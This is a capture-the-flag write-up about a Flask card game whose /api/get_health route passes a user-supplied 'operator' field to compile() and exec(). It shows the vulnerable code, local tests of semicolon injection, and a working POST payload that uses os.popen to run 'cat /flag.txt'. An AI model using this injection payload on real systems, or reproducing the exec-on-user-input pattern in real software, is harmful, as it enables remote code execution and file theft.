---
title: "Web Evaluation Check"
summary: "Remote Code Execution vulnerability by unsafe usage of exec function"
date: 2022-11-06T19:25:08+01:00
---

{{< attachements folder="files" pattern=".*\.zip$" >}}

# Web evaluation deck


# Information Gathering

## The application at-a-glance 🔍

Application is a card game that allows users to flip 8 cards.

![Untitled](images/Untitled.png)

If HP bar is depleted game is won.

![Untitled](images/Untitled%201.png)

At first glance there is no visible bug or vulnerability.

## Source code review

All of the source code was too big to upload here so only flask source code is stored, without images and other static files.

Only interesting file is `routes.py` as this file store all the logic used by application.

```python
from flask import Blueprint, render_template, request
from application.util import response

web = Blueprint('web', __name__)
api = Blueprint('api', __name__)

@web.route('/')
def index():
    return render_template('index.html')

@api.route('/get_health', methods=['POST'])
def count():
    if not request.is_json:
        return response('Invalid JSON!'), 400

    data = request.get_json()

    current_health = data.get('current_health')
    attack_power = data.get('attack_power')
    operator = data.get('operator')
    
    if not current_health or not attack_power or not operator:
        return response('All fields are required!'), 400

    result = {}
    try:
        code = compile(f'result = {int(current_health)} {operator} {int(attack_power)}', '<string>', 'exec')
        exec(code, result) #exec function allows to execute python code
        return response(result.get('result'))
    except:
        return response('Something Went Wrong!'), 500
```

First interesting thing is that this application uses `compile` and `exec` function.

Lets analyze the given source code.

```python
    data = request.get_json()

    current_health = data.get('current_health')
    attack_power = data.get('attack_power')
    operator = data.get('operator')
```

This piece of code parse `POST` body and get `current_health` , `attack_power` and `operator` parameters.

Next step is checking if all three variables are set this is the same as checking if all three parameters are passed in request.

```python
if not current_health or not attack_power or not operator:
        return response('All fields are required!'), 400
```

This part is most interesting because of use `exec` function. 

```python
 result = {}
    try:
        code = compile(f'result = {int(current_health)} {operator} {int(attack_power)}', '<string>', 'exec')
        exec(code, result) #exec function allows to execute python code
        return response(result.get('result'))
    except:
        return response('Something Went Wrong!'), 500
```

But before `exec` function call, user input is directly passed to `compile` function and then to `exec` and `current_health` and `attack_power` are casted to `int` . `result` variable are returned to the user in response.

# The Vulnerability

As there is no sanitization of user input there is possible RCE (Remote Code Execution) via `exec` function!

## Testing

As I’m not familliar with `compile()/exec()` function I copied relevant part of code to new python script for testing.

```python
current_health = '12'
operator = "+"
attack_power = '100'
result = {}

try:
    code = compile(f'result = {int(current_health)} {operator} {int(attack_power)}', '<string>', 'exec')
    exec(code, result)
    print(result.get('result'))
except:
    print('Something Went Wrong!')
```

After executing this script number `112` shows up.

![Untitled](images/Untitled%202.png)

`exec` function is capable of executing python code. User controls all three parameters but only `operator` is passed directly to `compile` rest parameters are converted to `int`

One modyfication for testing script is required, because in this state when something is wrong application pring `Something Went Wrong!` to get full traceback `try\execpt` block can be removed.

`operator` variable is set to `print(1)` if everything go well it should print `1`

```python
current_health = '12'
operator = "print(1)"
attack_power = '100'
result = {}
code = compile(f'result = {int(current_health)} {operator} {int(attack_power)}', '<string>', 'exec')
exec(code, result)
print(result.get('result'))
```

After executing script returns `SyntaxError: Invalid Syntax` and result is equal to `result = 12 print(1) 100` so 12 is `current_health` and 100 is `attack_power` 

![Untitled](images/Untitled%203.png)

Python can be run `inline` and next instruction are separated with semicolon `;` 

```python
current_health = '12'
operator = ";print(1);"
attack_power = '100'
result = {}
code = compile(f'result = {int(current_health)} {operator} {int(attack_power)}', '<string>', 'exec')
exec(code, result)
print(result.get('result'))
```

Executing this version yield expected results, script prints additional `1` in terminal window.

![Untitled](images/Untitled%204.png)

# Exploitation

With `Remote Code Execution` now we can read the flag.

```python
POST /api/get_health HTTP/1.1
Host: 127.0.0.1:1337
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://127.0.0.1:1337/
Content-Type: application/json
Origin: http://127.0.0.1:1337
Content-Length: 114
Connection: close
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin

{
	"current_health":"43",
	"attack_power":"33",
	"operator":";result = __import__('os').popen('cat /flag.txt').read();"
} 
```

After sending this malicious request to the server application returns with flag.

![Untitled](images/Untitled%205.png)

## Payload explanation

```
"operator":";result = __import__('os').popen('cat /flag.txt').read();"
```

- semicolons are here for valid python code exectution - without `;` signs interpreter throws `invalid syntax` error
- `result =` this overwrites variable that is returned in response to the user
- `__import__` is function called by regular `import` statement this allows to import modules directly so `__import__('os')` means the same as `import os` but can be done inline and can call function directly by referencing them as “objects”
- `popen('cat /flag.txt')` this function spawns shell process and executes command `cat /flag.txt`
- `read()` reads output of a process from `popen`
